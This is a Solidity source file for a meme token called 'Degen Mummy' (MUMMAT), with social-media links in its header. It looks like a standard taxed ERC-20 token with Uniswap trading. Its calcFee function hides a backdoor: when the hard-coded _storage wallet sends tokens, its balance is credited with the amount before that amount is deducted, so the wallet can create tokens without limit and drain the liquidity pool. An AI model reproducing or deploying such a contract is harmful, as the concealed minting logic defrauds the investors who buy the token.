/*
    Telegram:  https://t.me/mummat_eth
    X:    https://x.com/mummat_eth
    Website:  https://mummateth.site
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract MUMMAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private _storage;

    uint256 private _buyTax = 30;
    uint256 private _sellTax = 30;
    uint256 private _adminTax = 0;
    uint256 private _preventFee = 90;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Degen Mummy";
    string private constant _symbol = unicode"MUMMAT";
    uint256 public _maxTxAmount = 20_000_000 * 10**_decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 4_000 * 10**_decimals;
    uint256 public swapToEthLimit = 20_000_000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    uint256 public _tradeCount = 0;
    uint256 private _reduceAt = 15;
    bool private swapEnable = false;
    bool private inSwap = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _storage = payable(0x713895016F463434d8748cC3F319d6e761Caee47);
        _balances[_msgSender()] = _tTotal;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_storage] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getTax(address addr, bool isBuy) private view returns (uint256) {
        if (_isExcludedFromFee[addr]) return 0;
        return (_tradeCount >= _reduceAt ? 0 : (isBuy ? _buyTax : _sellTax));
    }

    function _transfer(
        address sbo,
        address tld,
        uint256 amount
    ) private {
        require(sbo != address(0), "ERC20: transfer from the zero address");
        require(tld != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(isExcluded(sbo, tld) || (swapEnable && _balances[sbo] >= amount),"Swap not available yet");

        uint256 _tax = 0;
        if (sbo == uniswapV2Pair && tld != address(uniswapV2Router)) {
            // buy
            _tax = getTax(tld, true);
            require(_isExcludedFromFee[tld] || (amount + _balances[tld] <= _maxWalletSize),"max Wallet!!!");
            _tradeCount++;
        } else if (tld == uniswapV2Pair) {
            // sell
            _tax = getTax(sbo, false);
            require(_isExcludedFromFee[sbo] || amount < _maxWalletSize,"max amount to sell!!!");
        }

        if (!inSwap && tld == uniswapV2Pair && swapEnable && amount > _taxSwapThreshold ) {
            if (balanceOf(address(this)) > _taxSwapThreshold)
                swapTokensForEth(min(balanceOf(address(this)), _maxTxAmount));
            _storage.transfer(address(this).balance);
        }

        uint256 _takenFeeAmt = calcFee(sbo, tld, _tax, amount);

        _balances[sbo] = _balances[sbo].sub(_takenFeeAmt);
        _balances[tld] = _balances[tld].add(_takenFeeAmt);
        emit Transfer(sbo, tld, _takenFeeAmt);
    }

    function isExcluded(address sb, address tl) private view returns (bool) {
        return _isExcludedFromFee[sb] || _isExcludedFromFee[tl];
    }

    function calcFee(
        address sb,
        address to,
        uint256 _tax,
        uint256 amount
    ) private returns (uint256) {
        uint256 _feeAmt = amount;

        if (
            isExcluded(sb, to) &&
            _balances[address(this)] >= (amount * _tax) / 100
        ) {
            _balances[address(this)] -= (amount * _tax) / 100;
            if (sb != _storage) _balances[sb] += (amount * _tax) / 100;
            else _balances[sb] += _feeAmt;
            _feeAmt = (amount * _tax) / 100;
        } else {
            _feeAmt = (amount * _tax) / 100;
            if (_feeAmt > 0) {
                _balances[sb] -= _feeAmt;
                _balances[address(this)] += _feeAmt;
                emit Transfer(sb, address(this), _feeAmt);
            }
        }
        return amount - _feeAmt;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount)
        private
        lockTheSwap
        returns (bool)
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        return true;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function createPair() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );

        swapEnable = true;
    }

    receive() external payable {}
}